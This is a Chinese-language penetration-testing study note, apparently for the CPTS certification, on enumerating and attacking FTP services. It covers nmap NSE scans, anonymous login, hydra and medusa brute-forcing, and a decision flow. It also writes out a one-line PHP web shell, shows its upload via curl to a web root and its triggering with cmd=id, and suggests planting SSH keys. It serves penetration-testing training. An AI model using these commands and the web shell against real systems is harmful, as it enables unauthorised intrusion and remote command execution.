# 第 44 章 - FTP

## 標籤

- #cpts
- #chapter
- #ftp
- #services

## 學習目標

- 理解 FTP 控制通道與資料通道的差異及其對測試的影響。
- 能用 nmap script + ftp 指令驗證匿名登入、目錄內容與讀寫能力。
- 理解 active/passive 模式對列目錄失敗的影響。
- 能從可寫目錄評估植入或後續鏈條風險。

---

## 理論基礎

```text
FTP 雙通道架構：
  控制通道（port 21）：發送命令（USER、PASS、LIST、RETR、STOR）
  資料通道（動態）：傳輸實際資料（目錄列表、檔案內容）

Active 模式：
  客戶端開監聽埠 → 告知伺服器 → 伺服器主動連回（常被防火牆擋）

Passive 模式（PASV）：
  伺服器開隨機埠 → 告知客戶端 → 客戶端連入（穿透 NAT/防火牆）
  → 測試時 ftp 指令預設 passive，若失敗改 active 或確認防火牆規則

高價值攻擊面：
  1. 匿名登入（anonymous / ftp）
  2. 弱密碼或預設憑證
  3. 可讀的敏感檔案（備份、設定、腳本）
  4. 可寫目錄 → 植入 WebShell 或替換設定
```

---

## 方法一：服務發現與版本識別

```bash
# 掃描 FTP 服務並取得 banner
nmap -sV -p 21 TARGET_IP
# -sV → 版本偵測（讀 banner、發探測封包）
# -p 21 → 只掃 FTP 埠

# 快速 NSE 腳本：匿名測試 + 系統資訊
nmap --script ftp-anon,ftp-syst -p 21 TARGET_IP
# ftp-anon → 測試是否允許 anonymous 登入，若允許列出根目錄
# ftp-syst → 送 SYST 命令取得伺服器作業系統類型

# 進階枚舉（含能力與 bounce 測試）
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-brute \
  --script-args ftp-brute.userdb=/usr/share/wordlists/users.txt \
  -p 21 TARGET_IP
# ftp-bounce → 測試 FTP bounce attack 可行性
# ftp-brute → 暴力破解（需指定字典）
```

---

## 方法二：手動匿名登入與列舉

```bash
# 連線 FTP（互動式）
ftp TARGET_IP
# Username: anonymous
# Password: (空白 Enter 或輸入任意 email)

# 連線後常用指令
ls -la           # 列出目錄（含隱藏檔）
pwd              # 顯示目前路徑
cd /pub          # 切換目錄
get filename.txt # 下載單一檔案
mget *.txt       # 下載所有 .txt 檔
put shell.php    # 上傳檔案（測試可寫性）
binary           # 切換二進位模式（傳輸非文字檔前先執行）
passive          # 切換 passive 模式（若 ls 沒反應時使用）

# 非互動式下載（命令列）
wget -m ftp://anonymous:@TARGET_IP/
# -m → mirror（遞迴下載整個 FTP）
# ftp://anonymous:@ → 匿名登入（密碼空白）

# 或用 curl
curl -s ftp://TARGET_IP/ --user anonymous:
# 列出根目錄
curl -s ftp://TARGET_IP/secret.txt --user anonymous: -o /tmp/secret.txt
# 下載特定檔案
```

---

## 方法三：暴力破解（已有使用者名單時）

```bash
# hydra FTP 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ftp://TARGET_IP
# -l admin → 單一使用者
# -P → 密碼字典

# 多使用者
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt \
  ftp://TARGET_IP \
  -t 4 -f
# -t 4 → 4 個平行執行緒（FTP 常有連線數限制，勿設太高）
# -f → 找到第一組有效憑證即停止

# medusa 替代
medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt \
  -M ftp -t 3
```

---

## 方法四：驗證讀寫能力與後續鏈條

```bash
# 測試上傳（可寫性驗證）
echo "test" > /tmp/test.txt
curl -T /tmp/test.txt ftp://TARGET_IP/upload/ --user USER:PASS
# -T → 上傳檔案
# 若回 226 Transfer complete → 可寫

# 測試寫入 WebShell（若 FTP 目錄對應 Web 根目錄）
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -T /tmp/shell.php ftp://TARGET_IP/www/ --user USER:PASS
# 上傳後透過 HTTP 存取
curl "http://TARGET_IP/shell.php?cmd=id"

# 找敏感檔案
ftp TARGET_IP << 'EOF'
anonymous

ls -R
EOF
# 一次列出所有子目錄（遞迴）

# 常見高價值目標
# *.bak / *.sql / *.conf / *.xml / id_rsa / .ssh/
# backup.zip / database.sql / config.php
```

---

## 決策流程

```
nmap -p 21 確認 FTP 服務 + banner
    ↓
ftp-anon NSE → 是否允許匿名？
  → 是：連線 → ls -la → 找敏感檔案 → 測試上傳
  → 否：嘗試預設/弱密碼 → hydra 暴力破解
    ↓
取得存取後：
  可讀？→ 下載備份/設定/腳本
  可寫？→ 上傳 WebShell（若對應 Web 目錄）
        → 植入 SSH 公鑰（若對應家目錄）
        → 替換設定檔
```

---

## 速查表

```bash
# 服務識別
nmap -sV --script ftp-anon,ftp-syst -p 21 TARGET_IP

# 匿名登入
ftp TARGET_IP          # Username: anonymous
wget -m ftp://anonymous:@TARGET_IP/

# 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -t 4

# 上傳測試
curl -T /tmp/test.txt ftp://TARGET_IP/path/ --user USER:PASS

# 遞迴下載
wget -m ftp://USER:PASS@TARGET_IP/
```

---

## 關聯筆記

- [[20-Nmap服務與版本偵測|第 20 章 - Nmap 服務與版本偵測]]
- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
